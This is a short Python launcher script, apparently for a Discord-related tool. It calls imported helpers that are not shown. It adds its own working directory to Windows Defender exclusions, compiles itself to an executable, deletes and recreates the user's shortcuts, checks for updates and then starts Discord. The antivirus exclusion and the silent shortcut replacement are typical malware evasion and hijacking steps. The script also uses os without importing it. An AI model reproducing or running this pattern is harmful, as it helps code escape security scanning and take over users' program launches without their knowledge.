from defender import add_to_defender_exclusions
from compiler import compile_to_exe, delete_original_shortcuts, create_new_shortcuts, send_notification, start_discord
from updater import check_for_updates
from run import main

if __name__ == "__main__":
    current_directory = os.getcwd()
    
    # Add working directory to Windows Defender exclusions
    add_to_defender_exclusions(current_directory)
    
    # Compile everything into an executable
    compile_to_exe()
    
    # Delete original shortcuts
    delete_original_shortcuts()
    
    # Create new shortcuts
    create_new_shortcuts()
    
    # Send notification
    send_notification()
    
    # Check for updates
    check_for_updates()
    
    # Start Discord
    main()
